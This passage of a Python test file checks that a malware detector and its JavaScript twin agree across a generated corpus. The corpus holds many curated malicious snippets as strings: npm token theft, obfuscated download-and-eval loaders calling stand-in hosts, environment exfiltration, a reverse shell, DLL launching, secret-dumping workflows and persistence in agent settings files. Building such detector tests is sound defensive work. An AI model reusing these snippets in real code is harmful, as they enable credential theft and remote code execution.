           ".github/workflows/x.yml", ".github\\workflows", "/contents/", "~/.vscode/extensions/x", "'.cursor'",
           "'extensions'", "/.vscode-server/extensions", "fs.writeFileSync(", "writeFile(", "outputJson(p, ",
           "json.dump(c, ", "open(p, 'w')", "open(p, \"ab+\")", "shutil.copy(", ".write_text(", "cpSync(",
           "createOrUpdateFileContents(", " > ", " >> ", "tee ", "cp -r ", "mv ", "Set-Content -Path ", "git add ",
           "git commit", "code --install-extension ", "cursor.cmd --install-extension x", "--install-extension",
           "sudo code --install-extension a.vsix", "execSync(", "subprocess.run([", "console.log(",
           "./config.sh --url https://github.invalid/o/r --token T", "config.cmd", "--token", "actions-runner-osx-arm64-2.3.tar.gz",
           "actions/runner/releases", "https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/x.zip",
           "OVEN-SH/BUN/RELEASES", "oven-\u017fh/bun/relea\u017fes", "execFileSync(b, [s])", "${{ toJSON(secrets) }}",
           "toJson( secrets )", "TOJSON(SECRETS)", "to\u212aJSON", "\u00e9", "\U0001F600", "\u2028", "\x85"]
PERSIST_CURATED = [
    "const p = path.join(os.homedir(), '.claude', 'settings.json');\nfs.writeFileSync(p, s);",
    "fs.writeFileSync(`${home}/.claude/settings.local.json`, s)", "echo \"$HOOKS\" > .cursor/hooks.json",
    "p = Path.home() / '.gemini' / 'settings.json'\nwith open(p, 'w') as f:\n    f.write(s)",
    "const d = '.vscode' + '/'; x('.vscode', 'tasks.json'); fs.writeFileSync(a, b)",
    "console.log('see .vscode/tasks.json')", "fs.writeFileSync(a, b); x('.vscode', 'settings.json')",
    "git add .github/workflows/x.yml && git commit -m x",
    "await put(`/repos/${o}/${r}/contents/.github/workflows/w.yml`, body)",
    "const y = 'on: push\\njobs:\\n  a:\\n    env:\\n      D: ${{ toJSON(secrets) }}';\nfs.writeFileSync('.github/workflows/f.yml', y);",
    "code --install-extension ./x.vsix", "execSync(`${cli} --install-extension ${vsix} --force`)",
    "console.log('run: code --install-extension foo')", "cp -r ext ~/.vscode-server/extensions/",
    "./config.sh --url https://github.invalid/o/r --token T --unattended --name r1 && nohup ./run.sh &",
    "const url = `https://github.com/oven-sh/bun/releases/download/bun-v${V}/${asset}.zip`;\nexecFileSync(binPath, [entry]);\n",
    "const w = '.github/workflows/x.yml';\nconst y = `env:\\n  D: ${{ toJSON(secrets) }}`;\n",
]
# code that publishes packages and collects npm tokens (SC-SELF-PUBLISH and the
# install-script test, 0.1.8), and an install script that runs a DLL: the
# commands, renames, package.json writes, token reads and split names
PUBLISH = ["\n", "\n", " ", ";", "(", ")", "'", '"', "`", ",", " + ", "=", "==", "=>", "[", "]", "{", "}", "\\",
           "exec('npm publish --access public', cb)", "execSync(\"npm publish\")", "spawn('npm', ['publish'])",
           "spawnSync(\"pnpm\", [\"publish\", \"--no-git-checks\"])", "subprocess.run(['npm', 'publish'])",
           "os.system('cd pkg && yarn publish')", "exec(`npx npm publish`)", "execa('bun', ['publish'])",
           "console.log('npm publish')", "npm publish", "publish", "exec(", "system(", "run(", "npm ", "publish ",
           "packageData.name = ", "pkg[\"name\"] = ", "pkg.name == x", "this.name = ", "p.name =>", "name = ",
           "`${randomName}-sluey`", "uniqueName", "packageData", "pkg", "JSON.stringify(packageData, null, 2)",
           "fs.writeFileSync('package.json', ", "writeFile(\"./package.json\", ", "outputJsonSync(pkgPath, ",
           "with open('package.json', 'w') as f:\n    json.dump(pkg, f)", "json.dump(", "dump(pkg, f)",
           "write_text(json.dumps(pkg))", "'package.json'", "package.json", "\u00e9", "\U0001d41a", "x" * 300,
           "path.join(os.homedir(), '.npmrc')", "readFileSync(rcPath, 'utf8')", ".npmrc", "_authToken",
           "/(?:_authToken\\s*=\\s*|:_authToken=)([^\\s]+)/", "execSync('npm config get //registry.npmjs.org/:_authToken')",
           "npm config get registry", "NPM_TOKEN", "process.env.NPM_TOKEN",
           "rundll32", "regsvr32.exe", "RUNDLL32", "rund\u0131ll32", "'rund' + 'll32'", '"regs"+"vr32"',
           "path.join(__dirname, './node-gyp' + '.dll')", "'node-gyp.dll'", "url.dll,FileProtocolHandler",
           "shell32.dll,Control_RunDLL", "C:\\Windows\\x.dll", "'.dll'", "\u212aeymgr.dll", "a.DLL",
           "require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](", ".dll", "32"]
PUBLISH_CURATED = [
    "const fs = require('fs');\nconst { exec } = require('child_process');\npackageData.name = `${randomName}-sluey`;\n"
    "fs.writeFileSync('package.json', JSON.stringify(packageData, null, 2));\n"
    "exec('npm publish --access public', (error, stdout, stderr) => {});\n",
    "const packageJson = require('./package.json');\npackageJson.name = uniqueName;\n"
    "fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));\nexecSync('npm publish', { stdio: 'inherit' });\n",
    "import json, subprocess\npkg = json.load(open('package.json'))\npkg['name'] = new\n"
    "with open('package.json', 'w') as f:\n    json.dump(pkg, f)\nsubprocess.run(['npm', 'publish'])\n",
    # a release tool: bumps the version, publishes, never renames
    "pkg.version = next;\nfs.writeFileSync('package.json', JSON.stringify(pkg));\nexecSync('npm publish');\n",
    # renames, but writes something else
    "pkg.name = n;\nfs.writeFileSync('out.json', JSON.stringify(pkg));\nexecSync('npm publish');\n",
    "const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
    "const m = rc.match(/:_authToken=([^\\s]+)/);\nspawn(process.execPath, [deploy], { env: { T: m[1] } });\n",
    "const t = execSync('npm config get //registry.npmjs.org/:_authToken').toString();\n",
    "require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n",
    "execSync('rundll32 url.dll,FileProtocolHandler https://example.invalid')",
    "subprocess.run(['regsvr32', '/s', 'C:\\\\x\\\\helper.dll'])",
]
# names and code in strings a file decodes as it runs, statements over several
# rows, environment variables, Function.constructor, and a file written and
# run with a shell or an interpreter (0.1.8): helpers, decode calls, arrays,
# members named by literals, and the pieces around them
DECODED = ["\n", "\n", " ", "  ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", " + ", ".", "\\", "\\\n",
           "function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }",
           "const d = (s) => Buffer.from(s, 'base64').toString();", "def unh(x):\n    return bytes.fromhex(x).decode()\n",
           "g('72657175697265')", "g('6178696f73')", "g('706f7374')", "g('7468656e')", "g('7a')", "g('0a')", "g('6')",
           "d('Y2hpbGRfcHJvY2Vzcw==')", "d('Y2hp')", "unh('6f73')", "g(x)", "g",
           "Buffer.from('6f73', 'hex').toString()", "Buffer.from(\"6874747073\", \"hex\").toString('utf8')",
           "Buffer.from('aHR0cHM=', 'base64').toString()", "Buffer.from('zz', 'hex').toString()",
           "atob('ZXZhbA==')", "atob('ZXZhbA=')", "atob(`Y2hpbGRfcHJvY2Vzcw==`)",
           "bytes.fromhex('6f73').decode()", "base64.b64decode('b3M=').decode()", "binascii.unhexlify('6f73').decode()",
           "b64decode(b'cmVxdWVzdHM=').decode('utf-8')", "let hl = [", "const _0x = ['a', 'b'];", "'axios', ",
           "'post'", "'https://x.invalid/a'", "hl[1]", "hl[3]", "hl[0]", "_0x[1]", "hl.push(1)", "hl[2] = 1",
           "require(hl[1])[[hl[2]]](hl[3], { ...process.env })", "[[hl[7]]](r => eval(r.data))",
           "process['env']", "process[\"env\"]", "x['post'](", "['a']", "'ch' + 'ild_process'", "\"ht\" + \"tps\"",
           "os.environ['P'] = ", "os.environ.get('P')", "os.getenv('P', '')", "environ['P']", "process.env['P'] = ",
           "process.env['P']", "process.env.P", "exec(os.getenv('P'))", "eval(process.env['P'])",
           "require(process.env.M)", "requests.get(u).text", "(await axios.get(u)).data", "axios",
           "\n  .post(u, {v})", "\n  .then((r) => {", "\n    eval(r.data);", "\n  })", "subprocess.run(",
           "\n    ['curl', '-sL',", "\n     'https://x.invalid/p.js'],", "\n    capture_output=True)",
           "subprocess.run(['node', '-e', r.stdout])", "new Function.constructor('require', s)",
           "[].constructor.constructor(r.data)", "Object.constructor(c)", "['constructor']['constructor'](c)",
           "open(p, 'wb')", "f.write(r.content)", "f.write(base64.b64decode(b64))", "b64 = 'aW1wb3J0IG9z'",
           "subprocess.run(['/bin/bash', p])", "spawn('node', [f])", "fork(dst)", "os.system('sh ' + p)",
           "subprocess.run([sys.executable, p])", "fs.writeFileSync(f, body)", "execfile(p)", "runpy.run_path(p)",
           "\u00e9", "\U0001F600", "\u0663", "x" * 80]
DECODED_CURATED = [
    # (0.1.8, the follower's adversarial pass) members by name, and a runner handed to a call
    "import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n",
    "import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
    "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
    "const vm = require('vm');\nfetch('https://c2.invalid/p').then((r) => r.text()).then(vm.runInThisContext);\n",
    "(async () => { (0, eval)(await (await fetch('https://c2.invalid/p')).text()); })();\n",
    "fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n",
    # the tailwind-book-icon family, hex names through a helper and a constant array
    "\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
    "let hl = [\n    g('72657175697265'),\n    g('6178696f73'),\n    g('706f7374'),\n"
    "    g('68747470733a2f2f782e696e76616c69642f61'),\n    g('68656164657273'),\n    g('782d7365637265742d686561646572'),\n"
    "    g('736563726574'),\n    g('7468656e'),\n];\n\nconst writer = () => require(hl[1])[[hl[2]]](hl[3], "
    "{ ...process.env }, { [hl[4]]: { [hl[5]]: hl[6] } })[[hl[7]]](r => eval(r.data));\n\nmodule.exports = writer;\n",
    # postman-converters: hex-decoded module names, a member named by a literal
    "(() => {\n  const _0x1a = require(\n    Buffer.from(\"6f73\", \"hex\").toString()\n  );\n  const _0x2b = require(\n"
    "    Buffer.from(\"6874747073\", \"hex\").toString()\n  );\n  const e = Object.fromEntries(Object.keys(process[\"env\"])"
    ".map(k => [k, process[\"env\"][k]]));\n  const req = _0x2b.request({ hostname: 'collector.invalid', method: 'POST' });\n"
    "  req.write(JSON.stringify(e));\n  req.end();\n})();\n",
    # chai-use-chain: Function.constructor runs what a download holds
    "const axios = require('axios');\n(async () => {\n  const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;\n"
    "  const handler = new Function.constructor(\"require\", s);\n  handler(require);\n})();\n",
    # prettier's fluent chain, and a formatter's call over several rows
    "const axios = require(\"axios\");\n(async ()=> {\n    try {\n        axios\n            .post(\"https://x.invalid/a\", {version })\n"
    "            .then((r) => {\n                // c\n                eval(r.data.model);\n            });\n    } catch (e) {}\n})();\n",
    "import subprocess\nif True:\n    r = subprocess.run(\n        ['curl', '-sL',\n         'https://x.invalid/p.js'],\n"
    "        capture_output=True, text=True, timeout=10\n    )\n    if r.stdout:\n        subprocess.run(['node', '-e', r.stdout],\n"
    "                       capture_output=True, timeout=30)\n",
    # a received value carried by environment variables
    "import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n",
    "const axios = require('axios');\n(async () => {\n  process.env['M'] = (await axios.get(u)).data;\n  require(process.env['M']);\n})();\n",
    # ptmpl and litellm: a script downloaded, or decoded, written and run with an interpreter
    "import subprocess, os, requests\n\ndef download_and_run_script():\n    script_url = 'https://x.invalid/s.sh'\n"
    "    script_path = os.path.join(os.path.expanduser('~'), 's.sh')\n    response = requests.get(script_url)\n"
    "    with open(script_path, 'wb') as file:\n        file.write(response.content)\n    os.chmod(script_path, 0o755)\n"
    "    subprocess.run(['/bin/bash', script_path, '--restore'])\n",
    "import subprocess, base64, sys, tempfile, os\n\nb64_payload = \"aW1wb3J0IG9zCg==\"\n\n"
    "with tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, \"p.py\")\n    with open(p, \"wb\") as f:\n"
    "        f.write(base64.b64decode(b64_payload))\n    \n    subprocess.run([sys.executable, p])\n",
    "const b = Buffer.from(blob, 'base64');\nfs.writeFileSync(f, b);\nspawn(f, [], { detached: true });\n",
    # the MAJOR shapes: a download written and required, or started by its path
    "const body = await (await fetch(u)).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
    "import os, requests\nd = requests.get(u).content\nopen('r.sh', 'wb').write(d)\nos.system('r.sh')\n",
    # more reasons only the decoded strings show
    "const cp = require(atob('Y2hpbGRfcHJvY2Vzcw=='));\nconst h = require(atob('aHR0cHM='));\n"
    "h.get(u, (res) => { let b = ''; res.on('data', (c) => { b += c; }); res.on('end', () => cp.execSync(b)); });\n",
    "import os\nrq = __import__(bytes.fromhex('7265717565737473').decode())\nexec(rq.get(u).text)\n",
    "const n = require('ne' + 't');\nconst s = new n.Socket();\ns.connect(4444, '10.0.0.1', () => {\n"
    "  const sh = require('child' + '_process').spawn('/bin/sh', []);\n  s.pipe(sh.stdin);\n  sh.stdout.pipe(s);\n});\n",
    "const o = require(Buffer.from('6f73', 'hex').toString());\nrequire('https').get('https://abc.oastify.com/?h=' + o['hostname']());\n",
    "function dec(s) { return Buffer.from(s, 'base64').toString(); }\nconst f = require(dec('ZnM='));\n"
    "const t = f.readFileSync(require('path').join(require('os').homedir(), dec('Lm5wbXJj')), 'utf8');\n"
    "fetch('https://collector.invalid', { method: 'POST', body: t + '_authToken' });\n",
]
# scripts a script starts with node or python (0.1.8): the calls, flags,
# path forms and names assigned them, and the pieces around them
SPAWN = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "\\", "/", "..", ".", "-",
         "spawn(process.execPath, [", "spawnSync('node', [", "execFile(\"nodejs.exe\", [", "execFileSync(process.argv[0], [",
         "fork(", "subprocess.Popen([sys.executable, ", "subprocess.run(['python3', ", "check_output([\"python\", ",
         "spawn(cmd, [", "run([x, ", "'lib/x.js'", "\"./a/b.js\"", "`w.js`", "'-e'", "'-m'", "'-r'", "'--require=./p.js'",
         "'--no-warnings'", "'-c'", "'-X'", "'dev'", "path.join(__dirname, 'x.js')", "path.resolve(__dirname, './lib', 'c.js')",
         "path.join(here, 'y.js')", "os.path.join(os.path.dirname(__file__), 'start.py')",
         "os.path.join(os.path.dirname(os.path.abspath(__file__)), '_rt', 's.py')", "Path(__file__).parent",
         "__dirname + '/w.js'", "__dirname+\"/q.js\"", "`${__dirname}/t.js`", "`${ __dirname }/u.js`",
         "const script = ", "let here = ", "_d = ", "script", "here", "_d", "f", "const f = path.join(__dirname, 'z.js');",
         "path.join(", "__dirname", "'..'", "'a\\b.js'", "'/abs.js'", "'x'.repeat(3)", "\u00e9", "\U0001F600",
         "], { detached: true })", "])", ")", "x" * 40]
SPAWN_CURATED = [
    "const { spawn } = require('child_process');\nconst path = require('path');\n"
    "const filePath = path.join(__dirname, 'smtp-connection/index.js');\n"
    "const child = spawn(process.execPath, [filePath], {\n  detached: true,\n  stdio: ['ignore', 'ignore', 'ignore']\n});\n"
    "child.unref();\n",
    "function runJobA(args) {\n  const script = path.resolve(__dirname, \"./lib/caller.js\");\n"
    "  const child = spawn(\"node\", [script, JSON.stringify(args)], {\n    detached: true,\n    stdio: \"ignore\"\n  });\n}\n",
    "_runtime_dir = os.path.join(os.path.dirname(__file__), \"_runtime\")\n_start = os.path.join(_runtime_dir, \"start.py\")\n"
    "if os.path.exists(_start):\n    subprocess.Popen(\n        [sys.executable, _start],\n        cwd=_runtime_dir,\n    )\n",
    "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\nspawn('node', ['-e', code])\n",
    "spawn(process.execPath, ['-r', './preload.js', '--no-warnings', 'lib/main.js'])\n",
    "const a = b, c = path.join(__dirname, 'a.js');\nfork(c);\n",
]
SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
           "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
           "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
           ".exe", "x"]


def corpus(seed=20260926, scale=1):
    """CURATED, then random cases of 1 to `most` pieces of each alphabet.
    Each is the text both engines read from JSON (a package.json string):
    a lone surrogate stays one, but a high one next to a low one is the
    character they encode (a Python str could keep the two apart, a
    JavaScript string cannot)."""
    rnd = random.Random(seed)
    cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
             + DECODED_CURATED + SPAWN_CURATED)
    for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                (SELF, 1500, 14), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10)):
        for _ in range(count * scale):
            cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
    for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
        head = rnd.choice(["", " ", "\t", "/usr/bin/", "/usr/bin/env ", "/usr/bin/env -S ", "env\t", "/bin/", "\n"])
        name = rnd.choice(["node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "PY",
                           "pypy", "sh", "bash", "zsh", "perl", "env", "\u212ash", "\u017fh", "x"])
        after = rnd.choice(["", " ", "\t", "\n", "\r\n", "\x1c", "\xa0", "/"])
        cases.append("#!" + head + name + after + "".join(rnd.choice(SHEBANG) for _ in range(rnd.randint(0, 6))))
    return [json.loads(json.dumps(text)) for text in cases]


def shlex_tokens(cmd):
    """_hook_tokens' shlex reading of cmd, or None where shlex raises."""
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""
        return list(lex)
    except ValueError:
        return None


def core_view(text):
    """core's answers for one case, in FIELDS order (as JSON would carry them)."""
    return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
            core.install_script_risk(text), list(core.import_time_risk(text)), core.node_candidates(text),
            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
            core.shebang_lang(text), list(core.import_time_risk(text, "py")), list(core.import_time_risk(text, "js")),
            core.self_publish_at(text), core.runs_dll(text), core.join_string_pieces(text), core.decoded_view(text),
            [list(t) for t in core.spawned_scripts(text)]]


def start_npm(cases):
    """Start js/src/lib/hooks.js on the cases in the background (it runs while
    core reads them: the suite's time is the slower engine's, not the sum);
    finish_npm collects its answer."""
    p = subprocess.Popen([NODE, "--input-type=module", "-e", NPM_HOOKS, HOOKS_JS], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8", errors="replace")
    box = {}
    worker = threading.Thread(target=lambda: box.update(out=p.communicate(json.dumps(cases), timeout=60)))
    worker.start()
    return p, worker, box


def finish_npm(started):
    """(PY_TWINS, [results per case]) from the node process start_npm began."""
    p, worker, box = started
    worker.join()
    stdout, stderr = box["out"]
    if p.returncode:
        raise AssertionError(f"node exited {p.returncode}: {stderr[-2000:]}")
    out = json.loads(stdout)
    return out["twins"], out["results"]


def run_npm(cases):
    """(PY_TWINS, [results per case]) from js/src/lib/hooks.js."""
    return finish_npm(start_npm(cases))


def mismatches(cases, views, results, limit=20):
    """[(case, field, core's, npm's)] for the first `limit` differences."""
    found = []
    for text, view, got in zip(cases, views, results):
        for field, want, have in zip(FIELDS, view, got):
            if want != have:
                found.append((text, field, want, have))
                if len(found) >= limit:
                    return found
    return found


@unittest.skipUnless(NODE, "node is not installed")
class HookParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.cases = corpus()
        started = start_npm(cls.cases)
        cls.views = [core_view(text) for text in cls.cases]
        cls.twins, cls.results = finish_npm(started)

    def test_every_case_agrees(self):
        self.assertEqual(len(self.results), len(self.cases))
        self.assertTrue(all(len(r) == len(FIELDS) for r in self.results))
        self.assertEqual(mismatches(self.cases, self.views, self.results), [])

    def test_the_corpus_reaches_every_path(self):
        """Guards the comparison against a corpus that stopped exercising
        something: each count is well above zero for this seed."""
        counts = collections.Counter()
        for text, view in zip(self.cases, self.views):
            tokens, _, (targets, complete), install, (on_import, _), _, codes, lang, py, js = view[:10]
            counts["self-publishing"] += view[10] >= 0
            counts["runs a DLL"] += view[11] is not None
            counts["prose read out (py)"] += py[0] != on_import
            counts["prose read out (js)"] += js[0] != on_import
            counts["shlex raises"] += tokens is None
            if lang:
                counts[f"#! {lang}"] += 1
            counts["targets"] += bool(targets)
            counts["not followed completely"] += not complete
            counts["node -e codes"] += bool(codes)
            counts["decoded view"] += view[13] != text
            counts["spawned scripts"] += bool(view[14])
            for reason in install + on_import:
                key = reason.split(" (")[0]                 # (the exfiltration reason names the address)
                counts["a reason in decoded strings"] += reason.endswith(core._DV_NOTE)
                for head in ("downloads a script and runs it with", "writes code it decodes to a file and runs it with"):
                    if key.startswith(head) and key != "downloads a script and runs it with Python":
                        key = head + " a shell or an interpreter"
                counts[key] += 1
        # 10 install-script reasons (the environment, an exfiltration address, a pipe, received code in
        # three kinds, encoded PowerShell with and without a download-run, PowerShell that downloads and
        # runs, a stager, a reverse shell, host information) and the import-time ones (a harvest sent over
        # the network or to a service, a download run by a shell, received code, a download run with or
        # without Python, a beacon to a capture service; several share the install-script text), the
        # targets, shlex, node -e and completeness counters, and 3 #! languages
        # and the cases where reading a file without its prose (import_time_risk with a language)
        # changes the answer, for Python and for JavaScript, and code read back from the file itself;
        # and the 6 persistence reasons (0.1.7); and (0.1.8) the 3 reasons for publishing, npm tokens and a
        # DLL run, with the self-publishing and DLL counters; a script downloaded or decoded, written and run
        # with a shell or an interpreter, a decoded file run, the decoded view and a reason only it shows
        self.assertEqual(len(counts), 45, counts)
        # these reasons are rarer in the random stream but present (curated) and well above zero
        rare = {"not followed completely", "deserializes data it receives over the network",
                "loads a module named by data it receives over the network", "downloads a file and then runs it",
                "downloads a script and runs it with Python", "runs an encoded PowerShell command",
                "runs an encoded PowerShell command that downloads and runs code",
                "runs PowerShell that downloads and runs code",
                "carries a GitHub Actions workflow that dumps every repository secret",
                "downloads the Bun runtime from GitHub and runs code with it", "self-publishing",
                "downloads a script and runs it with a shell or an interpreter", "writes a file it decodes and runs it",
                "a reason in decoded strings"}
        self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
        self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
        self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
        self.assertGreaterEqual(counts["loads a module named by data it receives over the network"], 25, counts)
        self.assertGreaterEqual(counts["downloads a file and then runs it"], 4, counts)
        self.assertGreaterEqual(counts["downloads a script and runs it with a shell or an interpreter"], 20, counts)
        self.assertGreaterEqual(counts["writes a file it decodes and runs it"], 10, counts)
        self.assertGreaterEqual(counts["a reason in decoded strings"], 6, counts)
        self.assertGreaterEqual(counts["carries a GitHub Actions workflow that dumps every repository secret"], 30, counts)
        self.assertGreaterEqual(counts["downloads the Bun runtime from GitHub and runs code with it"], 30, counts)
        self.assertGreaterEqual(counts["self-publishing"], 30, counts)

    def test_pattern_text_and_names_are_cores(self):
        """The JS module carries core's pattern text verbatim, with the same
        flags, and the same name sets (flags: i = re.I, m = re.M)."""
        for name, (src, flags) in self.twins["patterns"].items():
            with self.subTest(pattern=name):
                rx = getattr(core, name)
                self.assertEqual(src, rx.pattern)
                self.assertEqual(flags, ("i" if rx.flags & re.I else "") + ("m" if rx.flags & re.M else ""))
                self.assertFalse(rx.flags & re.S)
        for name, names in self.twins["sets"].items():
            with self.subTest(names=name):
                self.assertEqual(sorted(names), sorted(getattr(core, name)))
        for name, table in self.twins["maps"].items():
            with self.subTest(options=name):
                self.assertEqual(table, {k: sorted(v) for k, v in getattr(core, name).items()})
        self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
                                                ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH",
                                                 "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_JOIN_ROWS", "_DL_JOIN_CHARS",
                                                 "_DL_LOGICAL_MAX_CHARS",
                                                 "_DL_ALIAS_MAX",
                                                 "_PS_ENCODED_MAX", "_STAGER_MIN", "_STAGER_MAX_LITERALS",
                                                 "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES", "_SELF_READ_PASSES",
                                                 "_SELF_READ_MAX_CALLS", "_SELF_READ_ARG_SPAN", "_SELF_READ_MAX_ASSIGNS",
                                                 "_LITERAL_SPANS_MAX", "_PERSIST_MAX_LINES", "_SELF_PUB_SPAN",
                                                 "_SELF_PUB_MAX", "_DV_MAX_LITERAL", "_DV_BODY", "_DV_MAX_HELPERS",
                                                 "_DV_MAX_ARRAYS", "_DV_MAX_CHARS", "_SPAWN_MAX_DEPTH",
                                                 "_SPAWN_MAX_FILES", "_SPAWN_NAME_DEPTH", "_SPAWN_MAX_TARGETS")})
        self.assertEqual(len(self.twins["patterns"]), 126)
        self.assertEqual(len(self.twins["sets"]), 30)
        self.assertEqual(len(self.twins["maps"]), 4)

if __name__ == "__main__":
    unittest.main()
